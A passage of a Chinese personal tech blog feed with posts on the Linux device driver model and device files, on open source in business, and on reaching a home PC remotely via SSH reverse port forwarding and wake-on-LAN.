<h2 id="Device_Driver_Model的组成部分">Device Driver Model的组成部分</h2><p>这一节我们介绍Device Driver Model的组件：device、driver、bus和class。为什么要使用这些组件（本质上是数据结构）乃至为什么要使用Device Driver Model？网上有人总结得很精辟：统一了编写设备驱动的格式，使驱动开发从论述题变为填空体，从而简化了设备驱动的开发[1]。</p>
<h3 id="kobject——骨架">kobject——骨架</h3><p>我阅读的关于Device Driver Model的资料一般都会在一开始介绍kobject，然而并没有告诉我们为什么要了解kobject。对熟悉面向对象编程概念的读者来说，一言以蔽之：kobject是device driver model中所有组件的基类，是模型的骨架，因此非常重要。如果对面向对象的概念不熟悉也不要紧，下面具体介绍为何我们需要kobject。</p>
<p>Device Driver Model是一种”类树状”的模型——本质上它是一张网，但大体上是树的形态。它把所有组件对象组织成树，然后又用符号链接在树上构建一些新的关系。一个简单的示意图如下：</p>
<p><img src="/img/device_model_tree_1.png" alt="device_model_tree_1"></p>
<p>为了表示这个关系，内核使用了kobject数据结构，利用kobject包含的parent、children、sibling等域对关系进行描述。</p>
<p>kobject的另外一个重要作用就是对各组件对象的引用进行计数。计数的好处在于可以保证资源会在合适的时候被释放。</p>
<p>不过kobject自身功能有限，仅仅能构建出一个关系骨架。事实上内核里通常并不直接使用这个数据结构，而是选择将kobject嵌入到真正完成动作的、更复杂的数据结构里，例如下面即将讨论的Device Driver Mode组件——device、driver、bus和class。Device Driver Model中的树形结构更精确的示意图如下：</p>
<p><img src="/img/device_model_tree_2.png" alt="device_model_tree_2"></p>
<p>后面我们会专门介绍所谓的“kobject嵌入到真正完成动作的、更复杂的数据结构”：device、driver等。现在我们介绍与kobject相关的另外两个数据结构：kset和ktype。</p>
<p>简言之，kset是盛放kobject的容器。从sysfs文件系统角度解释就是：一个kobject对应sysfs的一个目录（kobject属性对应其中的文件）。为了使sysfs结构层次化，需要建立高层次的目录去容纳kobject对应的目录，这些高层次的目录就是kset对应的目录。</p>
<p>ktype数据结构表示kobject的类型。它事实上是一组数据结构：kobj_set、kset_ktype等等。光看名字也不知道到底是什么，但我们还是尝试解释一下问什么起这个名字:ktype主要是定义一些针对kobject对象的操作。一类对象共享一组操作，取名ktype可能就是出于这个考虑吧。</p>
<h3 id="driver——描述驱动的数据结构">driver——描述驱动的数据结构</h3><p>注意的是driver本身不是驱动，它只是描述驱动的结构。下面我们用英文driver代表描述驱动的数据结构，中文“驱动”或“设备驱动”代表真正控制设备的驱动程序逻辑。后续的“device－设备”、”bus－总线“等也基本满足这个规则。</p>
<p>另外需要了解，驱动程序逻辑并不一定要有driver这一套东西。驱动逻辑本质上就是内核空间的一系列的回调函数（熟悉内核的读者已经知道这些回调函数具体是文件系统的fops函数指针），实现方法不一而足。但还记得吗？我们的device driver model就是为了统一驱动开发设计的，所以要使自己开发的驱动符合规范，就尽可能使用device driver model，所以还是为自己的驱动加上driver这一套吧！</p>
<h3 id="device——描述设备的数据结构">device——描述设备的数据结构</h3><h3 id="bus——描述总线的数据结构">bus——描述总线的数据结构</h3><p>仔细观察这些数据结构我们会发现，driver和device都有一个域指向bus，bus中也有两个链表保存所有与之相关的driver和device。所以它们三者关系是这样的: 每个device都隶属于一个bus，表示连接在这个bus上的设备。每个driver也隶属于一个bus，表示它是可以驱动这个bus上某一设备的驱动。bus保存着这些device和driver，这样就可以在插入新driver模块时匹配那些没有被驱动的device，也可以在加入新device时匹配相应的driver。这里的匹配就是遍历这两个链表。具体过程见下文。</p>
<h3 id="class——描述应用层视图的数据结构">class——描述应用层视图的数据结构</h3><h2 id="设备文件">设备文件</h2><p>让我们离开水深火热的内核来到应用层：我们作为用户在使用设备时并没有考虑到上文中描述的种种，而是通过“设备文件”这一简单接口轻松使用各类设备。在linux设计理念中，“一切皆文件”。设备也往往被抽象成一种特殊文件——“设备文件”。关于这个理念的理解，请参考拙作<a href="http://freemandealer.github.io/2016/06/04/device-driver-in-a-nutshell/">设备驱动 in a nutshell</a>。</p>
<p>在这里，我们解释设备文件是如何关联上对应设备的。首先介绍系统调用mknod：</p>
<pre><code>mknod -- <span class="keyword">make</span> device special <span class="keyword">file</span>
</code></pre><p>mknod应用程序的mannul中如是说。它的功能就是用来创建设备文件——再详细一些，就是在目标文件系统树中创建一个表示设备文件的节点。一般我们将设备文件保存在/dev/目录下，但在其它目录中创建设备文件也是允许的。作为应用程序，或是系统调用，mknod的主要参数有两个：主设备号和次设备号。例如我们可以在当前目录创建设备文件freeman:</p>
<pre><code>&gt; mknod freeman c <span class="number">12</span> <span class="number">21</span>
&gt; ls
&gt; crw-r--r--  <span class="number">1</span> root     wheel   <span class="number">12</span>,  <span class="number">21</span>  <span class="number">8</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">36</span> freeman
</code></pre><p>这就创建了一个主设备号为12，次设备号21的字符设备（’c’表示字符设备）。我们可以尝试对该设备文件进行读写，发现操作总是不成功，提示“没有写权限”或是“设备尚未配置”——当然，我们的设备文件目前只是一个空壳，还没有关联上正真的设备。如何将两者关联上呢？</p>
<p>一个设备的设备号分为两类：主设备号和次设备号。前者表示设备的型号：如果两台设备型号相同，那么它们就有相同的主设备号，相同的设备当然可以使用同一驱动。那么如何分清两台型号相同的设备呢？这就需要用到次设备号。</p>
<p>既然驱动是和主设备号一一对应的，那么内核就可以根据mknod创建设备文件中的主设备号关联上设备驱动程序，从而关联上设备。具体过程如下：同操作普通文件一样，操作设备文件前需要open设备文件。这个open运行过程中了解到需要打开的文件是设备文件，那么它会去拿着设备号去搜索驱动。如果有幸对应驱动曾经被注册过，那么搜索过程必将成功结束。一旦找到对应驱动，就会将设备文件的fops赋值为驱动提供的fops。这个fops是个文件操作集合(file operations)的缩写，其中定义了包括read、write在内的各种文件操作在内核中的实现。例如我们读设备文件，最终就会调用对应驱动程序中定义的read操作——设备文件知道了自己该如何处理各种文件操作。这样从用户角度看，通过操作设备文件就可以为所欲为地操作底层设备了。</p>
<p>从2.6内核之后，设备节点就可以通过udev－uevent机制自动创建了。原理实际上并没有什么不同：原来需要手动输入的主次设备号现在由sysfs自动提供，通过class_create和device_create函数往sys文件系统中添加设备，udev检测到/sys目录的变动会根据变化在/dev目录下创建对应的设备节点[2]。</p>
<h2 id="Put_Them_Together">Put Them Together</h2><p>这一节我们尝试回答一个问题：从设备接入计算机到一切就绪，中间到底发生了什么？在回答这个问题之前，我们先来看一看LDD3的问题。LDD3是专门讲解Linux设备驱动程序设计的经典书籍，LDD3的读者应该还记得书中的第一个例子——简单字符设备scull<a href="https://github.com/martinezjavier/ldd3/tree/master/scull" target="_blank" rel="external">(代码在此)</a>。仔细研究scull的代码我们发现上文中提到的知识几乎一个也没体现——scull注册了一个cdev结构就结束了！（可能有人怀疑cdev会嵌入一个device结构体，事实上并没有！）这正是linux设计的巧妙之处：如果一个驱动开发者想做快速开发，他完全可以使用一组上层API来完成工作而不用清楚了解底下到底发生了什么。cdev就是一个高层次的封装，可以认为它是VFS(Virtual Filesystem)层面的结构，并不是device driver model的组件。所以从scull中，以及LDD3前面的其它几个例子中，看不到device driver model的影子，读者也不必惊慌，LDD3在后面有整整一章介绍了device driver model。</p>
<p>LDD3的问题不仅在于层次高，还在于它使用了“虚拟设备”做例子。LDD3为了不让准备实验材料的过程给读者造成障碍，并没有以实际硬件设备为例，而是选择把一段内存虚拟成设备进行操作（感谢LDD3的良苦用心）。这个方法在大部分情况下工作得非常好，但是在体会设备模型时却成了阻碍。我们分析阻碍的成因：用内存虚拟出的设备和真实设备的区别在于，内存是一直存在于系统中，没有一个“插在电脑上”的过程。所以LDD3例子的逻辑就是：</p>
<pre><code>模块初始化中初始化设备
</code></pre><p>而知道真相后，我们看到真实的故事远比这个复杂：</p>
<pre><code>模块初始化中注册driver
新driver加入系统后，<span class="keyword">bus开始为之匹配它可以驱动的device </span>(<span class="keyword">bus的match操作)
</span>新device加入到系统后，<span class="keyword">bus开始为之匹配driver </span>(<span class="keyword">bus的match操作)
</span><span class="label">driver</span>开始probe device，probe被认为是驱动程序的入口，会完成初始化设备的任务
</code></pre><p>我们看到，不管driver还是device加入系统，都会引起相关bus的match操作。这样可以保证不论driver先加入系统还是device先加入系统，device driver model都能很好地工作。如果device先加入系统，那就像买了一台超级复杂的机器(device)，翻箱倒柜找不到配套的说明书(driver)，需要等对方把说明书邮过来。如果XXX的说明书先到，那就把家里的机器都翻出来对一遍，发现没有名叫XXX的机器，那么就等着京东把XXX机器发过来。</p>
<p>新driver加入到系统，一般是在用户手动加载驱动模块时（也可以由udev自动加载，请看下文），在模块初始化代码中完成的。新device什么时候加入呢？一种情况是开机初始化系统时bus枚举设备时发生的。除此之外，系统运行过程中也可以加入device：热插拔。不是所有bus都无条件地支持热插拔。常用的支持热插拔 bus有著名的USB。USB总线可以侦测新插入的设备，并由USB子系统核心向系统注册对应新的device。如果没有合适的driver去匹配这个新device，系统会借助uevent机制结合应用空间的udev组件，去加载驱动模块(有兴趣可以翻阅一下拙作：<a href="http://freemandealer.github.io/2015/05/24/hotplug/">《Linux热插拔机制的介绍和应用》</a>，该文介绍了udev的应用)。小结一下：udev在device driver model中至少做两件事——自动创建设备文件节点和自动按需加载驱动模块。</p>
<p>不是说“虚拟设备”就不能体现device driver model，下面是github上的一个例子sparrow——“麻雀虽小，五脏具全”。它的device注册过程硬编码在一个模块初始化代码中，手动加载模块就可以注册device（可以认为是模拟热插拔）。</p>
<p><a href="https://github.com/wowotech/sparrow" target="_blank" rel="external">https://github.com/wowotech/sparrow</a></p>
<p>这一节的剩余部分解释一个新的问题：上述的这些动作（“注册”、“匹配”等）是谁来完成的？一个简单的回答是：总线。因为设备被连接在总线上，所以总线来完成这个任务逻辑上理所应当。</p>
<p>总线也可以被当作设备进行注册。和一般设备不同，它还有一些特殊的属性要注册，包括：match和event。这是与总线相关的driver或device被注册时需要调用的动作。为了方便和自己相关的device和driver结构的注册，总线一般会提供一些自己的注册函数封装通用的device_register/driver_register。下面是platform总线提供的两个注册函数:</p>
<pre><code>platform_device_register
     |<span class="string">-device_initialize(&amp;pdev-&gt;dev);
     </span>|<span class="string">     </span>|<span class="string">-kobject_init
     </span>|<span class="string">-platform_device_add(pdev)
          </span>|<span class="string">-device_add
               </span>|<span class="string">-kobject_add
               </span>|<span class="string">-device_create_file
               </span>|<span class="string">-device_create_file(uevent)
               </span>|<span class="string">-device_add_class_symlinks
               </span>|<span class="string">-device_add_attrs
               </span>|<span class="string">-bus_add_device
                    </span>|<span class="string">-Add device's bus attributes
                    </span>|<span class="string">-Create links to device's bus
                    </span>|<span class="string">-Add the device to its bus's list of devices
               </span>|<span class="string">-device_create_file(dev)
               </span>|<span class="string">-device_create_sys_dev_entry
               </span>|<span class="string">-kobject_uevent
               </span>|<span class="string">-bus_probe_device - probe drivers for a new device   &lt;—— 看这里
               </span>|<span class="string">-有关class的处理

platform_driver_register(xxx_drv)
     </span>|<span class="string">-drv-&gt;driver.bus/probe/remove…
     </span>|<span class="string">-bus_add_driver
               </span>|<span class="string">-loop to search and bind driver to devices     &lt;——这里
                        </span>|<span class="string">-driver_match_device                  &lt;——这里
                                </span>|<span class="string">-bus-&gt;match                   &lt;——这里
                        </span>|<span class="string">-driver_probe_device                  &lt;——这里
                                </span>|<span class="string">-driver-&gt;probe                &lt;——这里
                </span>|<span class="string">-module stuff
                </span>|<span class="string">-driver_create_file(uevent)
                </span>|<span class="string">-driver_add_groups
                </span>|<span class="string">-add_bind_files
       </span>|<span class="string">-driver_add_groups
       </span>|<span class="string">-kobject_uevent</span>
</code></pre><p>可以看到注册过程中均有上文中描述的“匹配”操作发生，以及uevent对应用层udev的通知。</p>
<h2 id="参考">参考</h2><p>[1] 蜗窝科技. Linux设备模型(1)_基本概念. <a href="http://www.wowotech.net/device_model/13.html" target="_blank" rel="external">http://www.wowotech.net/device_model/13.html</a></p>
<p>[2] 在驱动模块初始化函数中实现设备节点的自动创建. <a href="http://blog.csdn.net/zhenwenxian/article/details/5424434" target="_blank" rel="external">http://blog.csdn.net/zhenwenxian/article/details/5424434</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="写在前面">写在前面</h2><p>理解device driver model，我觉得最难的就是“忘掉自己曾经知道的”。学习内核很多情况下都需要这项技能：忘掉自己知道的，我们才不至于望文生义想当然，才能去接纳新知识，才能够耐着性子去阅读思考，才会更关注“为什么要这样呢”。所以如果刚接触Linux内核的你对设备驱动存在些许认识或者幻想，现在都请忘了吧。文中出现的术语如device、driver等，为了避免想当然，一开始都请把它当成一个名字而已，不要试图猜测其语义，也最好不要翻译成中文（所以请原谅文中的中英文混杂）。当我们理解了以后再看这些术语，我们就会恍然大悟它们为什么叫这个名字了。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[设备驱动 - in a nutshell]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/06/04/device-driver-in-a-nutshell/"/>
    <id>https://freemandealer.github.io/gallery/2016/06/04/device-driver-in-a-nutshell/</id>
    <published>2016-06-04T11:55:55.000Z</published>
    <updated>2020-01-09T05:50:53.517Z</updated>
    <content type="html"><![CDATA[<center><br><img src="/img/device_driver_monkey.jpg" alt=""><br></center>

<a id="more"></a>
<h2 id="“一切皆文件”">“一切皆文件”</h2><p>熟悉unix的人都知道有这么一种思想：一切皆文件。设备也被抽象成文件，并有个专有名称叫“设备文件”。计算机设备种类数也数不清，每个设备都需要在操作系统中定义自己的接口，这样整个系统就混乱的不成样子了：</p>
<p>“我是硬盘，我能接收指令，也能发送数据，给我留两个系统调用hard_disk_cmd和hard_disk_data”<br>“我是串口，我能发送和接收数据，也给我留两个serial_send和serial_recv”<br>“我是一个灯泡，我能接受亮度调整的指令，给我留个light_adjust”<br>“我是个咖啡机，我能接受命令make_coffee，你可以使用ready_coffee查询咖啡是不是做好了”<br>……</p>
<p>人们想到将设备的差异封装在底层，向上层提供一个统一的接口。什么接口比较好使呢？文件系统！文件系统提供的操作十分丰富，文件读和写和IO设备的输入输出刚好对应，一些非IO的控制类操作，文件系统也提供ioctl操作与之对应。特别是linux系统提供的VFS(Virtual File System,虚拟文件系统)这一抽象，使得一切皆文件的实现更加优雅。</p>
<p>“嘿硬盘，当用户朝你对应的设备文件写数据的时候，你就自己把这些数据写到你的介质上吧”<br>“嘿串口，你也是，当用户朝你对应的设备文件读／写数据的时候，你也自己把缓冲里的内容递给系统／发出去”<br>“灯泡，如果用户往你对应的设备文件里写了一个值，你就自己根据这个值调整亮度吧”<br>“咖啡机，如果你看见我在你对应的设备文件里写了一个make，那你就开始做咖啡吧。做好了把文件内容改成ready。”</p>
<p>linux的这个框架似乎非常完美！用户不用知道设备的详细信息，就可以为所欲为地操作自己的设备。因为在用户看来，所有插在计算机上的设备都是桌面上的一个文件。可以用记事本打开查看里面的值以获取设备目前的状态。也可以往文件里写点东西，就能改变设备的状态。对设备的编程也很容易，比如我们写一个定时煮咖啡的程序（假设咖啡机的设备文件为/dev/coffee_maker）：</p>
<pre><code> #!/bin/bash
<span class="keyword">sleep</span>(<span class="number">3600</span>);
<span class="keyword">echo</span> “<span class="keyword">make</span>” &gt; coffee_maker
</code></pre><p>好了，我们编写了一个三行的咖啡机程序，它会在一个小时以后自动煮咖啡。感受到设备文件使用的方便了吗？当我们往咖啡机的设备文件coffee_maker里写”make”的时候，实际是调用了系统调用sys_write，sys_write当时是蒙圈的，它不知道自己写的文件是个咖啡机。还好sys_write不负责主要的事情，它只是跑到内核里求助VFS。VFS知道coffee_maker这个文件的底细——它不是一个普通文件，而是一个设备文件。这时，VFS就执行专属于这台咖啡机的动作——煮咖啡！那么问题来了，VFS怎么知道如何煮咖啡？</p>
<h2 id="驱动的本质：一系列的回调函数">驱动的本质：一系列的回调函数</h2><center><br><img src="/img/device_driver_hierarchy.png" alt=""><br></center>

<p>谁教会VFS煮咖啡的？答案是：驱动程序！我们都有经历，插上一个设备，但计算机似乎不知道怎么使用它。有人提醒我们：“你装驱动了吗？”</p>
<p>联系上面我们说的驱动程序，我们不难发现驱动的本质：驱动程序就是一系列的回调函数，插在操作系统上，等着VFS不知道拿设备怎么办时调用。</p>
<h2 id="“这是一个USB接口的咖啡机”">“这是一个USB接口的咖啡机”</h2><p>紧接着又一个问题：系统如何为一个插入的设备匹配对应的驱动？你端着一杯正在发光的咖啡问出这个问题，因为你怀疑系统用控制灯泡的驱动去控制咖啡机。</p>
<p>生厂商号和设备号架起了设备和驱动的桥梁。先说设备这一边：每个生产商都被赋予了一个全球唯一的生产商号，如Intel生厂商号为8086。生厂商在自己内部，又会对自己生产的设备赋予一个设备号。一般来说，生厂商号和设备号就能唯一确定一种设备。设备通过总线连接在计算机上，例如我们平常使用的U盘，使用USB(Universal Serial Bus)总线。当一个设备插上总线后，会向系统主动报上自己的名号：生厂商号和设备号。</p>
<p>再说驱动这一边：驱动在安装进系统的时候，会向系统提交一张表，报告自己的工作范围：它能管理哪些硬件。表的内容是啥呢？聪明的你已经想到了，就是驱动能够管理的硬件的生厂商号和设备号。系统把这些表汇总起来，一旦有新硬件插进来，就去查查看看哪个驱动愿意管这个设备。一旦找到了并测试通过，驱动程序就开始初始化。初始化工作最重要的一步，就是创建上文中我们大谈特谈的设备文件。至此，设备文件、驱动、设备至上而下的通道已经贯通了，用户可以为所欲为了！</p>
<blockquote>
<h2 id="一点补充">一点补充</h2><h3 id="用户态驱动">用户态驱动</h3><p>硬件资源一般是由操作系统保护起来的，只有在内核态（高特权级状态）下才能被访问，用户态的程序是没有办法直接访问的。驱动程序作为直接控制设备的软件，可想而知是工作在内核态。可是有些同学可能听说过一种叫做“用户态驱动”的东西，这是个啥呢？</p>
<p>为什么要使用用户态驱动？首先用户态态编程容易呀：编程环境我们都熟悉，又有丰富的库，还可以使用自己喜欢的语言进行编写。另外，据说用户态驱动因为没有用户态－内核态切换的开销，有时候效率会比内核态驱动高一些。</p>
<p>用户态驱动是怎么实现的呢？对硬件的直接访问一般是不能再用户态进行的（在Intel x86体系下，我曾经听说过有个叫IOPL的标志位，可以控制IO端口是不是可以被用户态程序直接访问）。所以，应该是有一段功能简单的驱动把基本的操作通过设备文件暴露给用户态，然后再在用户态进行编程，扩展它的功能并提供更高层次的功能抽象。用户态驱动最终表现形式是一个软件库，供其它程序调用，或者是以服务器的形式，与应用程序进行交互，如X server。而内核态的驱动，往往作为内核的一个模块。</p>
<h3 id="动态加载">动态加载</h3><p>之前的文章<a href="http://freemandealer.github.io/2015/05/24/hotplug/">《Linux热插拔机制的介绍和应用》</a></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<center><br><img src="/img/device_driver_monkey.jpg" alt=""><br></center>]]>
    
    </summary>
    
      <category term="Notes" scheme="https://freemandealer.github.io/gallery/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[开源中的企业]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/06/03/open-source-and-enterprise/"/>
    <id>https://freemandealer.github.io/gallery/2016/06/03/open-source-and-enterprise/</id>
    <published>2016-06-03T06:46:48.000Z</published>
    <updated>2016-08-17T01:08:23.000Z</updated>
    <content type="html"><![CDATA[<p>之前接触开源纯粹是没项目做时找乐子以及被免费开放的源代码吸引，出于个人角度。通过近期与开源软件行业较为深入的合作，以及阅读的一些科普小文章，在这里谈谈我对开源和企业的理解。<br><a id="more"></a></p>
<p>提到开源，我想大家都会有至少这三个问题：</p>
<ul>
<li><p>为什么要使用开源软件？</p>
</li>
<li><p>为什么要投人力、财力给开源？</p>
</li>
<li><p>开源如何盈利？</p>
</li>
</ul>
<p>我发现站在不同的角度看这个问题，会有不同的答案。所以我将会以IT技术型企业、非IT技术型企业和开源技术方案提供商这三个企业的观点看这个问题。</p>
<p>作为互联网时代的企业，时不时地会用到信息技术解决方案，搭个数据分析平台、架设个站点啥的。如果他们使用商业解决方案，那似乎就踏上了一条不归路。商业解决方案很多都是黑盒子，一旦出了问题只能叫人来修，自己一边瞅着干插不了手干着急。对于那些分分钟交易上亿的企业，这个问题修复的周期是难以忍受的。另外，商业的方案坑比较多，想想最近的Win10强制升级吧…… 对于底层系统的完全掌控会给后期的系统维护、升级带来极大的便利。所以，企业想健康发展有两条路：自主研发，或者求助开源（当然也有自主研发再开源出去，暂且算在开源里了）。</p>
<p>作为一个IT技术型企业，例如互联网公司，他们应该是有能力进行资助研发的。但是如果有现成的，考虑到人力、财力和时间成本，当然会使用现成的。到这里，回答了第一个问题：为什么要使用开源？（不然呢……）</p>
<p>一般企业会对开源方案进行一圈调研，觉得合适的就用，差功能的就补上，渐渐地走上了投人力、财力给开源的路子。当然问了一圈没有适合的，那就自己开发呗。可是发现自身能力有限，又或是为了省成本，干脆把自己开发半拉子的方案开源出去，让其它人参与进来一起开发和维护，又不用给他们钱，何乐而不为呢？</p>
<p>企业参与开源当然是为了赚钱，毕竟企业一词的定义里明确说明“以盈利为目的”。企业求助开源方案，是在省成本没错。可是投精力狠搞开源似乎有些不靠谱？把自己的自主研发开源听起来简直是在为竞争对手做嫁衣！其实企业在投入开源时，也是在社区中树立威信。如果一个开源项目的80%代码都是你贡献的，你就有很大可能主导这个项目向着有利于自己的方向发展。站在长远角度看这个问题，企业绝对是从中获益的。那么把自己自主研发的项目开源是不是在扮演农夫与蛇呢？这得看企业对开源的“度”的把控。一般情况下，没人傻到把自己的赚钱核心公布出来。而且像现在80／20不平衡法则支配的互联网产业，相比用户和数据积累，想纯粹凭借技术力挽狂澜真的是非常难了。所以，开源自己的技术还是蛮安全的。</p>
<p>说完IT技术企业，开始说说非IT技术企业在开源里扮演什么样的角色。和IT技术企业一样，非IT们用相似的眼光考量着开源这块烙饼。它们的区别在于，非IT技术企业往往没有能力去自主研发或是参与开源。这种情况下，开源的优势就不能掩盖它的劣势了：首先很多开源软件不怎么易用，个人认为商业公司为用户考虑得还是挺周到的，说到底人家至少还有售后服务呢。例如OpenStack部署和架构的实施和维护成本较比VMware有了陡然提高。另外，一旦方案出问题，因为企业内部缺乏IT技术人员，所以只能求助社区。这种情况下，问题恢复周期远远长于商业方案。</p>
<p>所以怎么才能解决这些弊端呢？除了花钱自己维护一个开源团队（这样就类似IT技术企业了），还有个办法就是把维护外包给第三方——这就是我们要提到的第三类企业——专业的开源技术方案提供商。它们就像商业软件的客服，完成对开源软件使用培训、功能部署、稳定性维护。通过这个来获取利润，听起来有些不靠谱啊…… 可是开源技术方案提供商的龙头企业红帽(RedHat)2015年收入20.5亿美元（我对这些以亿为单位的钱没什么概念，反正他们自己很激动）不知道能不能说明一丢丢问题。</p>
<p>专业的开源技术方案提供商本身也是会投入人力、财力进开源项目的，原因和第一类企业不一样——第一类企业做出软件就是为了服务自己的商业目的。开源技术方案提供商真的只是一心想把软件做好，这样就会有更多的人使用这个软件，它就可以获得更多客户，通过卖出更多的服务赚钱，走“曲线赚钱”的路线。</p>
<p>以上就是我对开源的些许理解。这些理解可能很浅显，但已经使我相信，开源真的在改变世界。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>之前接触开源纯粹是没项目做时找乐子以及被免费开放的源代码吸引，出于个人角度。通过近期与开源软件行业较为深入的合作，以及阅读的一些科普小文章，在这里谈谈我对开源和企业的理解。<br>]]>
    
    </summary>
    
      <category term="Notes" scheme="https://freemandealer.github.io/gallery/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在任何地方控制宿舍的电脑]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/04/04/remote-control/"/>
    <id>https://freemandealer.github.io/gallery/2016/04/04/remote-control/</id>
    <published>2016-04-04T09:41:09.000Z</published>
    <updated>2016-04-04T11:01:35.000Z</updated>
    <content type="html"><![CDATA[<p>三天假期出去浪，妈妈问我的代码是在哪里写的？</p>
<p><img src="/img/remote-control-wild.jpg" alt=""></p>
<a id="more"></a>
<p>这是我一直的梦想，在哪里都能用上电脑！当然绝不是指购买十台八台电脑放在生活圈的各个角落，而是指随时随地访问宿舍里的电脑。</p>
<h2 id="解决方案">解决方案</h2><p>问题就出在宿舍里的Dell处在内网，除了在一个子网的机器，别的任何机器都没法连接上它。</p>
<p><img src="/img/remote-control-false.jpg" alt=""></p>
<p>解决的方法就是在互联网上找一台大家都能访问的机器做中转，把对宿舍电脑的操作命令先传递到中转机器上，然后由它发送到宿舍电脑上执行。这个中转的一种实现就是ssh的端口转发。这可不是一个新鲜的玩意儿。</p>
<p><img src="/img/remote-control-true.jpg" alt=""></p>
<h2 id="那具体怎么操作？">那具体怎么操作？</h2><h3 id="第一步，寻找一台中转Relay">第一步，寻找一台中转Relay</h3><p>对于中转的机器要满足要求是：拥有公网IP，换句话说，必须能在因特网上找到。</p>
<h3 id="第二步，在宿舍的Dell上做反向端口转发:">第二步，在宿舍的Dell上做反向端口转发:</h3><pre><code><span class="tag">ssh</span> <span class="tag">-R</span> 34345<span class="pseudo">:localhost</span><span class="pseudo">:22</span> &lt;<span class="tag">relay-usr</span>&gt;<span class="at_rule">@<span class="keyword">&lt;relay-address&gt;</span></span>
</code></pre><p>这行命令会将localhost(Dell)的22号端口映射到Relay的34345端口上。这样，我们对于Relay的34345的操作都会被Relay投射到Dell的22号端口上，例如：我们对Relay的34345号端口发出ssh连接请求，连接请求将会被转发到Dell的22端口上，所以我们实际在连接Dell，而这正是我们想要的！</p>
<h3 id="第三步，修改中转机器配置">第三步，修改中转机器配置</h3><p>我们登陆Relay，检验转发是否成功:</p>
<pre><code>ssh <span class="tag">&lt;<span class="title">relay-usr</span>&gt;</span>@<span class="tag">&lt;<span class="title">relay-addr</span>&gt;</span>
</code></pre><p>根据提示输入密码，登陆Relay后，执行下面的命令：</p>
<pre><code>ssh  <span class="tag">&lt;<span class="title">dell-usr</span>&gt;</span>@<span class="tag">&lt;<span class="title">relay-address</span>&gt;</span> -p 34345
</code></pre><p>输入密码后我们登陆到Dell上。但操作还没有完全成功。这个端口转发只在relay机器上生效，还不能实现其它内网机器连接Dell。所以我们需要修改Relay上的ssh配置文件/etc/ssh/sshd_confg，打开GateawayPorts开关：</p>
<pre><code><span class="comment"># GatewayPorts no</span>
<span class="title">GatewayPorts</span> <span class="built_in">yes</span>
</code></pre><p>这样我们就可以在任意能连上因特网的机器上访问Dell了。</p>
<p>我们还可以尝试不同的ssh参数，获得一些功能。例如-f参数可以让转发在后台进行，不会因为当前会话的关闭而失效。</p>
<p>到这里文章就可以结束了。看我们的Dell，完美连接，流畅操作！……额，有一个问题，Dell得一直处在开机待命状态，这多浪费电呀、要排放多少CO2、多少小动物会因此丧生？为了避免Maxwellxly追来北京教导我保护环境，我决定加上一个远程电源控制。</p>
<h2 id="远程电源管理">远程电源管理</h2><ul>
<li>IPMI</li>
<li>phidgets</li>
<li><a href="http://www.digital-loggers.com/lpc.html" target="_blank" rel="external">http://www.digital-loggers.com/lpc.html</a></li>
</ul>
<p>上面这些都是远程电源控制的解决方案，涉及到各种硬件设备。作为我，为了节约成本，我会时常想起那句话：</p>
<blockquote>
<p>幸福来源于对已有物品的满足。</p>
</blockquote>
<p>我有啥？一块cubieboard（一款卡片电脑，和树莓派是一类），我已经打它主意很久了。cubieboard功耗极低，待机一个月才一度电。我想用cubieboard一直处于在线状态，通过连接它去启动功耗较大的Dell。于是整个系统就成这样子了：</p>
<p><img src="/img/remote-control-power.jpg" alt=""></p>
<p>那么cubieboard怎么去启动Dell呢？远程关机谁都会，问题出在把一台关着的电脑打开。想想半夜你床头的笔记本突然自己启动了……</p>
<p>好在现在的显卡都是支持wol（wake on lan, 网络唤醒）。虽然电脑是关着的，但是网卡还处在半死不活的状态，睁一只眼闭一只眼注意着网线上的信号。一旦它收到一串特定的字节，它就会把整台电脑唤醒。另外，wake on lan这个名字告诉我们，唤醒过程只存在于一个lan（局域网）里。很多路由器是不支持路由唤醒信号的。另外，最好使用有线局域网。</p>
<p>有了硬件的支持，我们看看怎么给网卡释放这个唤醒信号。Linux下有一个应用就叫wakeonlan。</p>
<p>安装</p>
<pre><code>apt-<span class="keyword">get</span> install wakeonlan
</code></pre><p>使用</p>
<pre><code>wakeonlan <span class="tag">&lt;<span class="title">target-MAC</span>&gt;</span>
</code></pre><p>哟嗬！电脑突然亮了，吓老子一跳！</p>
<p>好了，集齐了硬件、软件，剩下的就是把cubieboard也用第一部分介绍的方法暴露在因特网上，我们先连接它，让它唤醒Dell，接着再连接唤醒后的Dell。我打算再写一些脚本自动化一些过程，写一段<a href="http://www.cyberciti.biz/tips/linux-write-sys-v-init-script-to-start-stop-service.html" target="_blank" rel="external">SystemV服务脚本</a>开机启动……</p>
<p>但是我得停一下！写代码之前搜一遍Github是个好喜欢。运气不错，找到一款:Remote Wake/Sleep on LAN Server。它用web界面封装了wakeonlan和ping工具，可以实现唤醒和休眠(休眠只对windows机器有用)和机器状态查询，功能简洁干净！<a href="https://github.com/sciguy14/Remote-Wake-Sleep-On-LAN-Server/wiki/Installation" target="_blank" rel="external">使用说明点这里</a></p>
<center><br><br><img src="/img/remote-control-power-app1.jpg" alt="">  <img src="/img/remote-control-power-app2.jpg" alt=""><br><br></center>


<h2 id="等一下，你这个有点折腾！">等一下，你这个有点折腾！</h2><p>简短的回答：因为我能！</p>
<p>其实实现移动办公有很多很方便、廉价的方法，例如直接使用云主机或者使用teamviewer软件即可。我迂回一大圈的原因很简单：因为我能折腾。除此之外还有一些个人原因：</p>
<p>公共租赁的云主机可是大大满足了我的需求，除了一点：尽管我可以按喜好配置它使用它，它的所有权不是我的。对于我这种控制欲很强的人来说，我是不会把重要资料和会常久使用的系统部署在一台听别人摆布的机器上的。</p>
<p>Teamviewer这类软件为我们提供了因特网范围内的远程桌面服务，但图形化的远程操控是卡顿的、耗费流量的。更关键的是，很多情况下远程桌面本身就是冗余的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>三天假期出去浪，妈妈问我的代码是在哪里写的？</p>
